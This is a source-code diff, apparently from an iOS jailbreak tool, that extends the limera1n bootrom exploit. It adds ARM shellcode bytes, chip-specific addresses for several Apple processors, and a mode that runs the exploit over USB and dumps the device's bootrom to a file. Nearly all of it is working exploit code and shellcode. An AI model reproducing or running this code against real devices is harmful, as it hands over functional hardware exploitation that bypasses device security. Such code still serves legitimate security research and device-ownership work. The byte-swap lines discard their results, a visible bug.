@@ -19,6 +19,8 @@
 
 #include "sn0w.h"
 
+extern bool dump_bootrom;
+
 /* The following is from Chronic-Dev's syringe */
 
 unsigned char limera1n_payload[] = {
@@ -73,6 +75,21 @@ unsigned char limera1n_payload[] = {
 	0x00, 0x4b, 0x18, 0x47, 0x00, 0x00, 0x00, 0x41
 };
 
+unsigned char limera1n_dump_bootrom[] = {
+	0x08, 0xe0, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46,
+	0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0x08, 0x48, 0x00, 0x21,
+	0x08, 0x4a, 0x00, 0xf0, 0x05, 0xf8, 0x06, 0x48, 0x07, 0x49, 0x00, 0x22,
+	0x07, 0x4b, 0x98, 0x47, 0x0b, 0x78, 0x03, 0x70, 0x01, 0x30, 0x01, 0x31,
+	0x01, 0x3a, 0x00, 0x2a, 0xf8, 0xd1, 0x70, 0x47, 0x00, 0x00, 0x00, 0x84,
+	0x00, 0x30, 0x02, 0x00, 0x00, 0x40, 0x02, 0x00, /*0xb7, 0x08, 0x00, 0x00,*/
+	/* for s5l8930, change 0xb7, 0x08 (0x8b7) to 0xef, 0x07 (0x7ef) */ 
+};
+
+uint32_t limera1n_dump_bootrom_addresses[] = {
+	0x8b7,	/* 8922/8920 */
+	0x7ef,	/* 8930 */
+};
+
 unsigned int limera1n_payload_len = 584;
 
 int limera1n()
@@ -85,22 +102,42 @@ int limera1n()
 	unsigned int stack_address = 0x84033F98;
 	unsigned int shellcode_address = 0x84023001;
 	unsigned int shellcode_length = 0;
+	unsigned char bootrom_dump_sc[72];
+
+#ifdef BIG_ENDIAN
+	__builtin_bswap32(limera1n_dump_bootrom_addresses[0]);
+	__builtin_bswap32(limera1n_dump_bootrom_addresses[1]);
+#endif 
+
+	memcpy(bootrom_dump_sc, limera1n_dump_bootrom, sizeof(limera1n_dump_bootrom));
+	memcpy(bootrom_dump_sc + sizeof(limera1n_dump_bootrom), &limera1n_dump_bootrom_addresses[0], sizeof(uint32_t));
 
 	if (device->chip_id == 8930) {
 		max_size = 0x2C000;
 		stack_address = 0x8403BF9C;
 		shellcode_address = 0x8402B001;
+		memcpy(bootrom_dump_sc, limera1n_dump_bootrom, sizeof(limera1n_dump_bootrom));
+		memcpy(bootrom_dump_sc + sizeof(limera1n_dump_bootrom), &limera1n_dump_bootrom_addresses[1], sizeof(uint32_t));
 	}
 	if (device->chip_id == 8920) {
 		max_size = 0x24000;
 		stack_address = 0x84033FA4;
 		shellcode_address = 0x84023001;
+		/* no need to regen bootrom dumping shellcode */
 	}
 
 	memset(shellcode, 0x0, 0x800);
 	shellcode_length = sizeof(limera1n_payload);
 	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));
 
+	if(dump_bootrom == true) {
+		memset(shellcode, 0x0, 0x800);
+		shellcode_length = sizeof(limera1n_payload);
+		memcpy(shellcode, bootrom_dump_sc, 72);
+	}
+	
+	hex_dump(bootrom_dump_sc, 72);
+	
 	printf("Resetting device counters\n");
 	error = irecv_reset_counters(client);
 	if (error != IRECV_E_SUCCESS) {
@@ -141,11 +178,11 @@ int limera1n()
 	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
 	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
 
-	//printf("Executing exploit\n");
+	printf("Executing exploit\n");
 	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
-
 	irecv_reset(client);
 	irecv_finish_transfer(client);
+
 	printf("Exploit sent\n");
 
 	printf("Reconnecting to device\n");
@@ -154,6 +191,26 @@ int limera1n()
 		printf("%s\n", irecv_strerror(error));
 		printf("Unable to reconnect\n");
 		return -1;
+	}
+	
+	if(dump_bootrom == true) {
+		FILE *fp = fopen("bootrom.bin", "wb");
+		uint32_t address = 0;
+		unsigned char data[0x800];
+		
+		memset(data, 0, 0x800);
+		
+		do {
+			error = irecv_control_transfer(client, 0xA1, 2, 0, 0, data, 0x800, 100);
+			if(error < 0)
+				break;
+			fwrite(data, 1, 0x800, fp);
+			address += 0x800;
+			printf("Dumping 0x%08x\n", address);
+		} while(address < 0x10000);
+		
+		printf("dumped.\n");
+		exit(0);
 	}
 
 	return 0;
